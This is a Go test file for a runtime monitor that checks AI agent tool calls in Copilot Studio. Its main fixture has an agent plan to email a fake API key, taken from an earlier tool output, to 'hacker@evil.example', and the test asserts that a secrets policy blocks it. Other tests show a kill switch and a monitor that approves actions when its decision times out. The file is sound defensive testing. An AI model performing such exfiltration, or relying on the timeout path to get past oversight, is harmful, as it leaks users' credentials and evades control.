package handlers

import (
	"context"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
	"time"

	apitypes "github.com/obot-platform/obot/apiclient/types"
	"github.com/obot-platform/obot/pkg/api"
	"github.com/obot-platform/obot/pkg/provenance"
	"github.com/obot-platform/obot/pkg/provenance/copilot"
	"github.com/stretchr/testify/require"
	"k8s.io/apiserver/pkg/authentication/user"
)

const (
	copilotMetadata = `"conversationMetadata":{"agent":{"id":"agent-1","tenantId":"tenant-1","environmentId":"env-1","isPublished":true},"user":{"id":"user-1","tenantId":"tenant-1"},"conversationId":"conv-1","planId":"plan-1","planStepId":"%s"}`
)

// slowStore delays session resolution so a decision cannot fit the deadline.
type slowStore struct {
	provenance.Store
	delay time.Duration
}

func (s *slowStore) ResolveLink(ctx context.Context, key string) (string, error) {
	select {
	case <-time.After(s.delay):
	case <-ctx.Done():
		return "", ctx.Err()
	}
	return s.Store.ResolveLink(ctx, key)
}

func newCopilotTestHandler(t *testing.T, store provenance.Store, enforce ...string) *CopilotStudioHandler {
	t.Helper()
	engine := provenance.New(store)
	require.NoError(t, engine.Seed(t.Context()))
	for _, id := range enforce {
		policy, err := engine.Store().GetPolicy(t.Context(), id)
		require.NoError(t, err)
		policy.Mode = provenance.ModeEnforce
		require.NoError(t, engine.Store().PutPolicy(t.Context(), policy))
	}
	engine.Invalidate()
	return NewCopilotStudioHandler(engine)
}

func callRuntimeMonitor(t *testing.T, h *CopilotStudioHandler, body string) (int, copilot.Response, copilot.Result) {
	t.Helper()
	request := httptest.NewRequest(http.MethodPost, "/api/copilot-studio/runtime-monitor?api-version=2025-05-01", strings.NewReader(body))
	request.Header.Set("Content-Type", "application/json")
	request.Header.Set("x-ms-correlation-id", "fbac57f1-3b19-4a2b-b69f-a1f2f2c5cc3c")
	recorder := httptest.NewRecorder()
	require.NoError(t, h.RuntimeMonitor(api.Context{Request: request, ResponseWriter: recorder, User: &user.DefaultInfo{UID: "7", Groups: []string{apitypes.GroupAPI}}}))
	var resp copilot.Response
	var result copilot.Result
	if recorder.Code == http.StatusOK {
		require.NoError(t, json.Unmarshal(recorder.Body.Bytes(), &resp))
		if resp.Diagnostics != "" {
			require.NoError(t, json.Unmarshal([]byte(resp.Diagnostics), &result), "diagnostics must be pre-serialized JSON")
		}
	}
	return recorder.Code, resp, result
}

func TestCopilotStudioBlocksSecretLeavingConversation(t *testing.T) {
	store := provenance.NewMemStore()
	h := newCopilotTestHandler(t, store, "builtin-secrets-out")
	const secret = "sk-ant-api03-deploykey0123456789"
	planner := `"plannerContext":{"userMessage":"Check the production deploy status","previousToolOutputs":[{"toolId":"t1","toolName":"Get deploy key","outputs":[{"name":"key","value":"` + secret + `"}]}]}`

	// Step 1: a read-only tool, after a tool output that carried a secret.
	code, resp, result := callRuntimeMonitor(t, h, `{`+planner+`,
		"toolDefinition":{"id":"t2","type":"PrebuiltToolDefinition","name":"Get deployment status","description":"Reads the status of a deployment"},
		"inputValues":{"environment":"prod"},`+strings.Replace(copilotMetadata, "%s", "step-1", 1)+`}`)
	require.Equal(t, http.StatusOK, code)
	require.False(t, resp.BlockAction)
	require.Empty(t, resp.Reason)
	require.Len(t, result.Actions, 1)
	require.Equal(t, copilot.DecisionApprove, result.Actions[0].Decision)
	require.Equal(t, "Get deployment status", result.Actions[0].Name)
	require.NotEmpty(t, result.SessionID)

	// Step 2: the planner wants to email the secret out. The same previous
	// tool output is resent and must not be ingested twice.
	code, resp, result = callRuntimeMonitor(t, h, `{`+planner+`,
		"toolDefinition":{"id":"t3","type":"PrebuiltToolDefinition","name":"Send email","description":"Sends an email to specified recipients."},
		"inputValues":{"to":"hacker@evil.example","body":"the key is `+secret+`"},`+strings.Replace(copilotMetadata, "%s", "step-2", 1)+`}`)
	require.Equal(t, http.StatusOK, code)
	require.True(t, resp.BlockAction, "a secret from the conversation is in the outbound email")
	require.Equal(t, copilot.ReasonCodeDenied, resp.ReasonCode)
	require.Contains(t, resp.Reason, "Secrets never leave")
	require.Contains(t, resp.Reason, "evil.example")
	require.Len(t, result.Actions, 1)
	blocked := result.Actions[0]
	require.Equal(t, copilot.DecisionBlock, blocked.Decision)
	require.Equal(t, "builtin-secrets-out", blocked.PolicyID)
	require.Equal(t, provenance.EffectDeny, blocked.Effect)
	require.Equal(t, "agent-1", blocked.Server)
	require.NotEmpty(t, blocked.EventID)

	session, err := store.GetSession(t.Context(), result.SessionID)
	require.NoError(t, err)
	require.Equal(t, copilot.Agent, session.Agent)
	require.Equal(t, "Check the production deploy status", session.Title)
	require.Equal(t, []provenance.Surface{provenance.SurfaceCopilot}, session.State.Surfaces)
	require.True(t, session.State.Labels.Has(provenance.LabelSecret))
	require.Equal(t, 1, session.State.Denied)
	events, _, err := store.ListEvents(t.Context(), provenance.EventQuery{SessionID: session.ID, Ascending: true})
	require.NoError(t, err)
	var kinds []provenance.EventKind
	for _, ev := range events {
		kinds = append(kinds, ev.Kind)
		require.Equal(t, copilot.Agent, ev.Actor.Agent)
		if ev.Action != nil {
			require.Empty(t, ev.Action.Text, "content never persists")
		}
	}
	require.Equal(t, []provenance.EventKind{
		provenance.KindSessionStart, provenance.KindLLMTurn, provenance.KindToolResult, provenance.KindToolCall,
		provenance.KindToolCall,
	}, kinds, "the resent prompt and tool output enter the session once")
	require.Equal(t, events[1].ID, events[3].ParentID, "actions descend from the prompt")
}

func TestCopilotStudioTolerantPayload(t *testing.T) {
	store := provenance.NewMemStore()
	h := newCopilotTestHandler(t, store)
	h.ResolveUser = func(_ context.Context, _, email string) (string, error) {
		if email == "ada@example.com" {
			return "42", nil
		}
		return "", nil
	}
	code, resp, result := callRuntimeMonitor(t, h, `{"conversation_id":"conv-2","botId":"bot-2","agentName":"Expense bot","userPrincipalName":"ada@example.com",
		"query":"file my expenses",
		"history":[{"role":"user","content":"hi"},{"role":"tool","name":"lookup_receipts","content":"receipt total 12.50 from https://vendor.example/r/1"}],
		"plan":[{"toolName":"create_row","connector":"dataverse","inputs":{"table":"expenses"}},{"actionName":"post_message","connector":"teams","parameters":{"channel":"finance","text":"filed"}}]}`)
	require.Equal(t, http.StatusOK, code)
	require.False(t, resp.BlockAction)
	require.Len(t, result.Actions, 2)
	require.Equal(t, "create_row", result.Actions[0].Name)
	require.Equal(t, "dataverse", result.Actions[0].Server)
	require.Equal(t, "post_message", result.Actions[1].Name)
	require.Equal(t, "teams", result.Actions[1].Server)
	session, err := store.GetSession(t.Context(), result.SessionID)
	require.NoError(t, err)
	require.Equal(t, "42", session.UserID)
	require.Equal(t, "ada@example.com", session.Email)
	require.True(t, session.State.Labels.Has(provenance.LabelUntrusted), "an unknown tool's output is untrusted")
}

func TestCopilotStudioKillSwitch(t *testing.T) {
	store := provenance.NewMemStore()
	h := newCopilotTestHandler(t, store)
	_, err := h.engine.Kill(t.Context(), provenance.Kill{Scope: provenance.KillScopeAgent, Target: copilot.Agent, Reason: "incident"})
	require.NoError(t, err)
	code, resp, _ := callRuntimeMonitor(t, h, `{"plannerContext":{"userMessage":"go"},"toolDefinition":{"id":"t","type":"x","name":"List rows","description":""},"inputValues":{},`+strings.Replace(copilotMetadata, "%s", "step-1", 1)+`}`)
	require.Equal(t, http.StatusOK, code)
	require.True(t, resp.BlockAction)
	require.Equal(t, copilot.ReasonCodeKilled, resp.ReasonCode)
	require.Contains(t, resp.Reason, "kill switch")
}

func TestCopilotStudioAnswersApproveOnTimeout(t *testing.T) {
	h := newCopilotTestHandler(t, &slowStore{Store: provenance.NewMemStore(), delay: 2 * time.Second})
	h.Deadline = 50 * time.Millisecond
	start := time.Now()
	code, resp, result := callRuntimeMonitor(t, h, `{"plannerContext":{"userMessage":"go"},"toolDefinition":{"id":"t","type":"x","name":"Send email","description":""},"inputValues":{"to":"a@b.example"},`+strings.Replace(copilotMetadata, "%s", "step-1", 1)+`}`)
	require.Less(t, time.Since(start), time.Second, "the handler must answer by its deadline")
	require.Equal(t, http.StatusOK, code)
	require.False(t, resp.BlockAction)
	require.Equal(t, "decision timed out", resp.Reason)
	require.True(t, result.TimedOut)
}

func TestCopilotStudioRequestValidation(t *testing.T) {
	h := newCopilotTestHandler(t, provenance.NewMemStore())
	for _, tc := range []struct {
		name      string
		body      string
		status    int
		errorCode int
	}{
		{
			name:      "malformed",
			body:      `{"plannerContext":`,
			status:    http.StatusBadRequest,
			errorCode: copilot.ErrorCodeInvalidRequest,
		},
		{
			name:      "empty",
			body:      ``,
			status:    http.StatusBadRequest,
			errorCode: copilot.ErrorCodeInvalidRequest,
		},
		{
			name:      "no tool",
			body:      `{"plannerContext":{"userMessage":"hi"},"conversationMetadata":{"conversationId":"c"}}`,
			status:    http.StatusBadRequest,
			errorCode: copilot.ErrorCodeMissingField,
		},
	} {
		t.Run(tc.name, func(t *testing.T) {
			request := httptest.NewRequest(http.MethodPost, "/api/copilot-studio/runtime-monitor", strings.NewReader(tc.body))
			recorder := httptest.NewRecorder()
			require.NoError(t, h.RuntimeMonitor(api.Context{Request: request, ResponseWriter: recorder, User: &user.DefaultInfo{UID: "7"}}))
			require.Equal(t, tc.status, recorder.Code)
			var errResp copilot.ErrorResponse
			require.NoError(t, json.Unmarshal(recorder.Body.Bytes(), &errResp))
			require.Equal(t, tc.errorCode, errResp.ErrorCode)
			require.Equal(t, tc.status, errResp.HTTPStatus)
			require.NotEmpty(t, errResp.Message)
		})
	}

	request := httptest.NewRequest(http.MethodPost, "/api/copilot-studio/validate?api-version=2025-05-01", nil)
	recorder := httptest.NewRecorder()
	require.NoError(t, h.Validate(api.Context{Request: request, ResponseWriter: recorder, User: &user.DefaultInfo{UID: "7"}}))
	require.Equal(t, http.StatusOK, recorder.Code)
	require.JSONEq(t, `{"isSuccessful":true,"status":"OK"}`, recorder.Body.String())

	recorder = httptest.NewRecorder()
	require.NoError(t, NewCopilotStudioHandler(nil).Validate(api.Context{Request: request, ResponseWriter: recorder, User: &user.DefaultInfo{UID: "7"}}))
	require.Equal(t, http.StatusServiceUnavailable, recorder.Code)
}
